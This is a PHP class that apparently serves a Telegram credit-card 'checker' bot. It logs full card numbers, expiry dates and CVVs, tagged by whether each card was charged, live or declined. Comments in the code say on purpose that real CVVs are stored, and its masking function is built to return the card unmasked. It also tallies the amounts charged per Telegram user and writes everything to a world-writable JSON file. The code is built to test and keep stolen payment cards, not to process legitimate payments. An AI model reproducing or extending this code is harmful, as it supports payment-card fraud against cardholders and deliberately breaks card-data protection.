<?php
/**
 * CC Logs Manager
 * Stores and retrieves credit card check logs
 */

require_once 'config.php';
require_once 'database.php';

class CCLogsManager {
    private $db;
    
    public function __construct() {
        $this->db = Database::getInstance();
    }
    
    /**
     * Log a credit card check
     */
    public function logCCCheck($data) {
        try {
            // Check if MongoDB extensions are available
            if (!class_exists('MongoDB\BSON\UTCDateTime')) {
                error_log('MongoDB extension not available, using fallback logging');
                $this->saveLogFallback($data);
                return ['success' => true, 'log_id' => uniqid()];
            }
            
            $logData = [
                'telegram_id' => $data['telegram_id'] ?? null,
                'username' => $data['username'] ?? 'Unknown',
                'card_number' => $data['card_number'] ?? '', // Store real card number
                'card_full' => $data['card_full'] ?? '', // Store full card details
                'expiry' => $data['expiry'] ?? null,
                'cvv' => $data['cvv'] ?? null, // Store real CVV
                'status' => $data['status'] ?? 'unknown', // charged, live, declined, error
                'message' => $data['message'] ?? '',
                'response_code' => $data['response_code'] ?? null,
                'gateway' => $data['gateway'] ?? 'stripe',
                'amount_charged' => $data['amount_charged'] ?? 0,
                'currency' => $data['currency'] ?? 'USD',
                'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
                'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
                'checked_at' => new MongoDB\BSON\UTCDateTime(),
                'created_at' => new MongoDB\BSON\UTCDateTime()
            ];
            
            if ($this->db->useFallback ?? false) {
                $this->saveLogFallback($logData);
            } else {
                $collection = $this->db->getCollection(DatabaseConfig::CC_LOGS_COLLECTION);
                $collection->insertOne($logData);
            }
            
            return ['success' => true, 'log_id' => $logData['_id'] ?? uniqid()];
        } catch (Exception $e) {
            logError('Error logging CC check: ' . $e->getMessage());
            return ['success' => false, 'message' => $e->getMessage()];
        }
    }
    
    /**
     * Get charged cards logs
     */
    public function getChargedCards($limit = 50, $filters = []) {
        try {
            $query = ['status' => 'charged'];
            
            // Apply filters
            if (!empty($filters['user_id'])) {
                $query['telegram_id'] = $filters['user_id'];
            }
            
            if (!empty($filters['date_from'])) {
                $query['checked_at'] = ['$gte' => new MongoDB\BSON\UTCDateTime(strtotime($filters['date_from']) * 1000)];
            }
            
            if (!empty($filters['date_to'])) {
                if (!isset($query['checked_at'])) {
                    $query['checked_at'] = [];
                }
                $query['checked_at']['$lte'] = new MongoDB\BSON\UTCDateTime(strtotime($filters['date_to']) * 1000);
            }
            
            if ($this->db->useFallback ?? false) {
                return $this->getLogsFallback($query, $limit);
            }
            
            $collection = $this->db->getCollection(DatabaseConfig::CC_LOGS_COLLECTION);
            $logs = $collection->find($query, [
                'limit' => $limit,
                'sort' => ['checked_at' => -1]
            ])->toArray();
            
            return $logs;
        } catch (Exception $e) {
            logError('Error getting charged cards: ' . $e->getMessage());
            return [];
        }
    }
    
    /**
     * Get all logs with filters
     */
    public function getAllLogs($limit = 100, $filters = []) {
        try {
            $query = [];
            
            // Apply filters
            if (!empty($filters['status'])) {
                $query['status'] = $filters['status'];
            }
            
            if (!empty($filters['user_id'])) {
                $query['telegram_id'] = $filters['user_id'];
            }
            
            if (!empty($filters['date_from'])) {
                $query['checked_at'] = ['$gte' => new MongoDB\BSON\UTCDateTime(strtotime($filters['date_from']) * 1000)];
            }
            
            if ($this->db->useFallback ?? false) {
                return $this->getLogsFallback($query, $limit);
            }
            
            $collection = $this->db->getCollection(DatabaseConfig::CC_LOGS_COLLECTION);
            $logs = $collection->find($query, [
                'limit' => $limit,
                'sort' => ['checked_at' => -1]
            ])->toArray();
            
            return $logs;
        } catch (Exception $e) {
            logError('Error getting logs: ' . $e->getMessage());
            return [];
        }
    }
    
    /**
     * Get statistics
     */
    public function getStatistics($user_id = null) {
        try {
            $query = $user_id ? ['telegram_id' => $user_id] : [];
            
            if ($this->db->useFallback ?? false) {
                return $this->getStatsFallback($query);
            }
            
            $collection = $this->db->getCollection(DatabaseConfig::CC_LOGS_COLLECTION);
            
            $stats = [
                'total_checks' => $collection->countDocuments($query),
                'charged_cards' => $collection->countDocuments(array_merge($query, ['status' => 'charged'])),
                'live_cards' => $collection->countDocuments(array_merge($query, ['status' => 'live'])),
                'declined_cards' => $collection->countDocuments(array_merge($query, ['status' => 'declined'])),
                'total_amount_charged' => 0
            ];
            
            // Calculate total amount charged
            $pipeline = [
                ['$match' => array_merge($query, ['status' => 'charged'])],
                ['$group' => [
                    '_id' => null,
                    'total' => ['$sum' => '$amount_charged']
                ]]
            ];
            
            $result = $collection->aggregate($pipeline)->toArray();
            if (!empty($result)) {
                $stats['total_amount_charged'] = $result[0]['total'] ?? 0;
            }
            
            return $stats;
        } catch (Exception $e) {
            logError('Error getting statistics: ' . $e->getMessage());
            return [
                'total_checks' => 0,
                'charged_cards' => 0,
                'live_cards' => 0,
                'declined_cards' => 0,
                'total_amount_charged' => 0
            ];
        }
    }
    
    /**
     * Format logs for bot message
     */
    public function formatLogsForBot($logs, $max_items = 10) {
        if (empty($logs)) {
            return "📝 No logs found.";
        }
        
        $message = "📊 <b>CC Check Logs</b>\n\n";
        $count = 0;
        
        foreach ($logs as $log) {
            if ($count >= $max_items) {
                $message .= "\n... and " . (count($logs) - $max_items) . " more\n";
                break;
            }
            
            $status_emoji = $this->getStatusEmoji($log['status']);
            $card = $log['card_number'] ?? 'XXXX XXXX XXXX XXXX';
            $amount = $log['amount_charged'] ?? 0;
            $user = $log['username'] ?? 'Unknown';
            
            $time = 'Unknown time';
            if (isset($log['checked_at'])) {
                if ($log['checked_at'] instanceof MongoDB\BSON\UTCDateTime) {
                    $time = $log['checked_at']->toDateTime()->format('Y-m-d H:i:s');
                } else {
                    $time = date('Y-m-d H:i:s', strtotime($log['checked_at']));
                }
            }
            
            $message .= "{$status_emoji} <code>{$card}</code>\n";
            $message .= "├ Status: <b>{$log['status']}</b>\n";
            if ($amount > 0) {
                $message .= "├ Amount: \${$amount}\n";
            }
            $message .= "├ User: @{$user}\n";
            $message .= "└ Time: {$time}\n\n";
            
            $count++;
        }
        
        return $message;
    }
    
    /**
     * Mask card number for display (optional)
     */
    private function maskCardNumber($card_number) {
        // Return full card number without masking
        return $card_number;
    }
    
    /**
     * Get status emoji
     */
    private function getStatusEmoji($status) {
        $emojis = [
            'charged' => '💰',
            'live' => '✅',
            'declined' => '❌',
            'error' => '⚠️',
            'unknown' => '❓'
        ];
        return $emojis[$status] ?? '❓';
    }
    
    /**
     * Fallback methods
     */
    private function saveLogFallback($logData) {
        $logs = $this->loadLogsFallback();
        $logData['_id'] = uniqid();
        $logs[] = $logData;
        
        // Keep only last 1000 logs in fallback
        if (count($logs) > 1000) {
            $logs = array_slice($logs, -1000);
        }
        
        $dir = __DIR__ . '/data';
        if (!is_dir($dir)) {
            mkdir($dir, 0777, true);
        }
        
        file_put_contents($dir . '/cc_logs.json', json_encode($logs, JSON_PRETTY_PRINT));
    }
    
    private function loadLogsFallback() {
        $file = __DIR__ . '/data/cc_logs.json';
        if (!file_exists($file)) {
            return [];
        }
        return json_decode(file_get_contents($file), true) ?? [];
    }
    
    private function getLogsFallback($query, $limit) {
        $logs = $this->loadLogsFallback();
        
        // Simple filtering
        $filtered = array_filter($logs, function($log) use ($query) {
            foreach ($query as $key => $value) {
                if (!isset($log[$key]) || $log[$key] !== $value) {
                    return false;
                }
            }
            return true;
        });
        
        return array_slice($filtered, 0, $limit);
    }
    
    private function getStatsFallback($query) {
        $logs = $this->loadLogsFallback();
        
        $stats = [
            'total_checks' => 0,
            'charged_cards' => 0,
            'live_cards' => 0,
            'declined_cards' => 0,
            'total_amount_charged' => 0
        ];
        
        foreach ($logs as $log) {
            $match = true;
            foreach ($query as $key => $value) {
                if (!isset($log[$key]) || $log[$key] !== $value) {
                    $match = false;
                    break;
                }
            }
            
            if ($match) {
                $stats['total_checks']++;
                if ($log['status'] === 'charged') {
                    $stats['charged_cards']++;
                    $stats['total_amount_charged'] += $log['amount_charged'] ?? 0;
                } elseif ($log['status'] === 'live') {
                    $stats['live_cards']++;
                } elseif ($log['status'] === 'declined') {
                    $stats['declined_cards']++;
                }
            }
        }
        
        return $stats;
    }
}
?>
